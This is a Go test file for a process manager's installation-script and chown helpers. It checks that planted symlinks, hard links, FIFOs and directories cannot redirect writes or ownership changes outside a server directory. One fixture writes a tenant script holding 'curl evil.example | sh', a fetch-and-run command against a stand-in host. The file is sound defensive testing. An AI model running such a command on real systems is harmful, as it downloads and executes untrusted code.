//go:build linux || darwin

package processmanager

import (
	"os"
	"path/filepath"
	"strconv"
	"syscall"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

const (
	installScript        = "#!/bin/bash\r\nset -e\r\necho installed\r\n"
	installScriptOnDisk  = "#!/bin/bash\nset -e\necho installed\n"
	outsideScriptContent = "root:x:0:0"
)

// installScriptStand is a server directory opened as the root the installation
// script is written through, and next to it a file no installation may touch.
type installScriptStand struct {
	root      *os.Root
	serverDir string
	outside   string
	secret    string
}

func givenInstallScriptStand(t *testing.T) *installScriptStand {
	t.Helper()

	base := t.TempDir()
	serverDir := filepath.Join(base, "server")
	outside := filepath.Join(base, "outside")
	secret := filepath.Join(outside, "passwd")

	require.NoError(t, os.Mkdir(serverDir, 0o755))
	require.NoError(t, os.Mkdir(outside, 0o755))
	require.NoError(t, os.WriteFile(secret, []byte(outsideScriptContent), 0o600))

	root, err := os.OpenRoot(serverDir)
	require.NoError(t, err)
	t.Cleanup(func() { _ = root.Close() })

	return &installScriptStand{root: root, serverDir: serverDir, outside: outside, secret: secret}
}

func (s *installScriptStand) script() string {
	return filepath.Join(s.serverDir, installScriptName)
}

func (s *installScriptStand) assertOutsideUntouched(t *testing.T) {
	t.Helper()

	entries, err := os.ReadDir(s.outside)
	require.NoError(t, err)
	require.Len(t, entries, 1, "nothing may be created out of the server directory")

	info, err := os.Lstat(s.secret)
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o600), info.Mode(), "the file out of the server directory keeps its type and mode")

	content, err := os.ReadFile(s.secret)
	require.NoError(t, err)
	assert.Equal(t, outsideScriptContent, string(content))
}

// The installation script of a container is written into the server directory
// with the privileges of the daemon, under a name the tenant knows. Whatever
// the tenant left under that name is replaced by the script: nothing is
// written, and no mode changed, where a link there leads.
func TestWriteInstallScript(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		plant func(t *testing.T, s *installScriptStand)
		check func(t *testing.T, s *installScriptStand)
	}{
		{
			name:  "nothing_stands_under_its_name",
			plant: func(*testing.T, *installScriptStand) {},
		},
		{
			name: "link_to_a_file_outside",
			plant: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				require.NoError(t, os.Symlink(s.secret, s.script()))
			},
		},
		{
			name: "relative_link_to_a_file_outside",
			plant: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				require.NoError(t, os.Symlink("../outside/passwd", s.script()))
			},
		},
		{
			name: "link_to_a_missing_file_outside",
			plant: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				require.NoError(t, os.Symlink(filepath.Join(s.outside, "cron.d-job"), s.script()))
			},
		},
		{
			name: "link_to_a_file_of_the_server",
			plant: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				require.NoError(t, os.WriteFile(filepath.Join(s.serverDir, "server.cfg"), []byte("hostname"), 0o600))
				require.NoError(t, os.Symlink("server.cfg", s.script()))
			},
			check: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				content, err := os.ReadFile(filepath.Join(s.serverDir, "server.cfg"))
				require.NoError(t, err)
				assert.Equal(t, "hostname", string(content))
			},
		},
		{
			name: "second_name_of_a_file_outside",
			plant: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				require.NoError(t, os.Link(s.secret, s.script()))
			},
		},
		{
			name: "script_of_the_tenant",
			plant: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				require.NoError(t, os.WriteFile(s.script(), []byte("#!/bin/sh\ncurl evil.example | sh\n# and a long tail"), 0o600))
			},
		},
		{
			name: "directory",
			plant: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				require.NoError(t, os.Mkdir(s.script(), 0o755))
				require.NoError(t, os.WriteFile(filepath.Join(s.script(), "file"), []byte("x"), 0o644))
			},
		},
		{
			name: "fifo",
			plant: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				require.NoError(t, syscall.Mkfifo(s.script(), 0o644))
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			stand := givenInstallScriptStand(t)
			tt.plant(t, stand)

			err := writeInstallScript(stand.root, installScript)

			require.NoError(t, err)
			stand.assertOutsideUntouched(t)

			info, err := os.Lstat(stand.script())
			require.NoError(t, err)
			require.True(t, info.Mode().IsRegular(), "the script has to be a regular file, it is %s", info.Mode())
			assert.Equal(t, os.FileMode(0o755), info.Mode().Perm())

			content, err := os.ReadFile(stand.script())
			require.NoError(t, err)
			assert.Equal(t, installScriptOnDisk, string(content))

			if tt.check != nil {
				tt.check(t, stand)
			}
		})
	}
}

func TestRemoveInstallScript(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		plant func(t *testing.T, s *installScriptStand)
	}{
		{
			name: "script_is_removed",
			plant: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				require.NoError(t, writeInstallScript(s.root, installScript))
			},
		},
		{
			name: "link_put_in_its_place_is_removed_and_not_followed",
			plant: func(t *testing.T, s *installScriptStand) {
				t.Helper()

				require.NoError(t, os.Symlink(s.secret, s.script()))
			},
		},
		{
			name:  "nothing_to_remove",
			plant: func(*testing.T, *installScriptStand) {},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			stand := givenInstallScriptStand(t)
			tt.plant(t, stand)

			removeInstallScript(stand.root)

			_, err := os.Lstat(stand.script())
			require.ErrorIs(t, err, os.ErrNotExist)
			stand.assertOutsideUntouched(t)
		})
	}
}

func TestChownRecursive_InvalidOwner(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name      string
		uid       string
		gid       string
		wantError string
	}{
		{name: "user_name_instead_of_an_id", uid: "gameap", gid: "1000", wantError: "invalid uid: gameap"},
		{name: "group_name_instead_of_an_id", uid: "1000", gid: "gameap", wantError: "invalid gid: gameap"},
		{name: "empty_uid", uid: "", gid: "1000", wantError: "invalid uid: "},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			stand := givenInstallScriptStand(t)

			err := chownRecursive(stand.root, tt.uid, tt.gid)

			require.Error(t, err)
			assert.Contains(t, err.Error(), tt.wantError)
		})
	}
}

// The tree a container installed is handed to the game server user as root.
// A symlink in it is given the owner itself: what it leads to is not the
// tenant's to receive.
func TestChownRecursive_DoesNotFollowSymlinks(t *testing.T) {
	t.Parallel()

	if os.Geteuid() != 0 {
		t.Skip("changing the owner of files requires root")
	}

	const owner = 12345

	stand := givenInstallScriptStand(t)
	require.NoError(t, os.Mkdir(filepath.Join(stand.serverDir, "maps"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(stand.serverDir, "maps", "de_dust2.bsp"), []byte("bsp"), 0o644))
	require.NoError(t, os.Symlink(stand.secret, filepath.Join(stand.serverDir, "link_to_file")))
	require.NoError(t, os.Symlink(stand.outside, filepath.Join(stand.serverDir, "link_to_dir")))

	err := chownRecursive(stand.root, strconv.Itoa(owner), strconv.Itoa(owner))
	require.NoError(t, err)

	for _, name := range []string{".", "maps", "maps/de_dust2.bsp", "link_to_file", "link_to_dir"} {
		assert.Equal(t, owner, ownerOf(t, filepath.Join(stand.serverDir, name)), name)
	}

	assert.Zero(t, ownerOf(t, stand.secret), "the file a link leads to keeps its owner")
	assert.Zero(t, ownerOf(t, stand.outside), "the directory a link leads to keeps its owner")
}

func ownerOf(t *testing.T, path string) int {
	t.Helper()

	info, err := os.Lstat(path)
	require.NoError(t, err)

	stat, ok := info.Sys().(*syscall.Stat_t)
	require.True(t, ok)

	return int(stat.Uid)
}
